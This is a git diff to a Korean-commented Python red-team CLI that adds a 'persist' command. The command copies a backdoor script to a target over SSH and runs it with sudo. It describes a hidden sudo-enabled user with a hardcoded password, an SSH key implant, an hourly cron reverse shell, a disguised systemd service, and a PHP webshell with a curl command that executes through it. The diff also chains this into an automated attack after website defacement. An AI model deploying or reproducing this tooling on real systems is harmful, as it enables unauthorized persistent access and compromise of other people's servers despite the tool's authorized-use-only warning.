@@ -484,6 +484,102 @@ class RedChainCLI(cmd.Cmd):
         print(f"{Colors.OKCYAN}[*] 실행 중...{Colors.ENDC}\n")
         os.system(ssh_cmd)
 
+    def do_persist(self, arg):
+        """Persistence 백도어 설치 (Red Team 시뮬레이션)
+
+사용법:
+    persist install   - 백도어 설치 (사용자 생성, SSH 키, Cron, Systemd, 웹쉘)
+    persist cleanup   - 모든 백도어 제거 및 시스템 복구
+    persist info      - 설치된 백도어 정보 표시
+
+경고: 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!
+"""
+        if not self.target:
+            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
+            return
+
+        if not self.ssh_user:
+            print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다.{Colors.ENDC}")
+            return
+
+        # 스크립트 선택
+        if arg == 'cleanup':
+            script_name = 'cleanup_backdoor.sh'
+            action_msg = "백도어 제거"
+        elif arg == 'info':
+            # 정보 표시
+            print(f"\n{Colors.BOLD}설치 가능한 Persistence 메커니즘:{Colors.ENDC}\n")
+            print(f"{Colors.OKGREEN}1. 백도어 사용자:{Colors.ENDC}")
+            print(f"   - Username: sysupdate")
+            print(f"   - Password: Sys@Update2024#Secure")
+            print(f"   - Sudo: NOPASSWD ALL\n")
+
+            print(f"{Colors.OKGREEN}2. SSH 키 백도어:{Colors.ENDC}")
+            print(f"   - authorized_keys에 공개키 추가\n")
+
+            print(f"{Colors.OKGREEN}3. Cron 백도어:{Colors.ENDC}")
+            print(f"   - 매 시간마다 리버스 쉘 시도\n")
+
+            print(f"{Colors.OKGREEN}4. Systemd 서비스:{Colors.ENDC}")
+            print(f"   - system-update-check 서비스\n")
+
+            print(f"{Colors.OKGREEN}5. 웹쉘:{Colors.ENDC}")
+            print(f"   - 경로: /.system/health.php")
+            print(f"   - 인증키: RedTeam2024")
+            print(f"   - 사용: curl 'http://target/.system/health.php?key=RedTeam2024&cmd=id'\n")
+
+            print(f"{Colors.WARNING}[!] 설치: persist install{Colors.ENDC}")
+            print(f"{Colors.WARNING}[!] 제거: persist cleanup{Colors.ENDC}\n")
+            return
+        else:
+            script_name = 'backdoor_setup.sh'
+            action_msg = "백도어 설치"
+
+        script_path = self.project_root / '03_Persistence' / script_name
+
+        if not script_path.exists():
+            print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
+            return
+
+        print(f"{Colors.WARNING}[!] {action_msg}를 실행합니다.{Colors.ENDC}")
+        print(f"{Colors.RED}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")
+
+        # 확인
+        if arg != 'cleanup':
+            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
+            if confirm.lower() != 'yes':
+                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
+                return
+
+        # SSH 인증 방식 결정
+        if self.ssh_key:
+            sshpass_prefix = ""
+            ssh_opts = f"-i {self.ssh_key} -o StrictHostKeyChecking=no"
+        elif self.ssh_pass:
+            sshpass_prefix = f"sshpass -p '{self.ssh_pass}' "
+            ssh_opts = "-o StrictHostKeyChecking=no"
+        else:
+            sshpass_prefix = ""
+            ssh_opts = "-o StrictHostKeyChecking=no"
+
+        # 예전 스크립트 삭제
+        rm_cmd = f"{sshpass_prefix}ssh {ssh_opts} {self.ssh_user}@{self.target} 'rm -f /tmp/{script_name}'"
+        os.system(rm_cmd + " 2>/dev/null")
+
+        # 스크립트 전송
+        print(f"{Colors.OKBLUE}[*] 스크립트 전송 중...{Colors.ENDC}")
+        scp_cmd = f"{sshpass_prefix}scp {ssh_opts} {script_path} {self.ssh_user}@{self.target}:/tmp/"
+        result = os.system(scp_cmd)
+
+        if result != 0:
+            print(f"{Colors.FAIL}[-] 파일 전송 실패{Colors.ENDC}")
+            return
+
+        # 스크립트 실행
+        print(f"{Colors.OKBLUE}[*] {action_msg} 실행 중...{Colors.ENDC}\n")
+        ssh_cmd = f"{sshpass_prefix}ssh {ssh_opts} {self.ssh_user}@{self.target} 'sudo bash /tmp/{script_name}'"
+        os.system(ssh_cmd)
+
     # ==================== SSH 명령어 ====================
 
     def do_ssh(self, arg):
@@ -600,6 +696,11 @@ class RedChainCLI(cmd.Cmd):
             if confirm2.lower() == 'yes':
                 print(f"{Colors.OKBLUE}[*] 웹사이트 변조...{Colors.ENDC}")
                 self.do_deface('')
+
+            confirm3 = input(f"\n{Colors.WARNING}[!] Persistence 백도어를 설치하시겠습니까? (yes/no): {Colors.ENDC}")
+            if confirm3.lower() == 'yes':
+                print(f"{Colors.OKBLUE}[*] Persistence 백도어 설치...{Colors.ENDC}")
+                self.do_persist('install')
 
         print(f"\n{Colors.OKGREEN}[+] 자동 공격 체인 완료!{Colors.ENDC}\n")
 
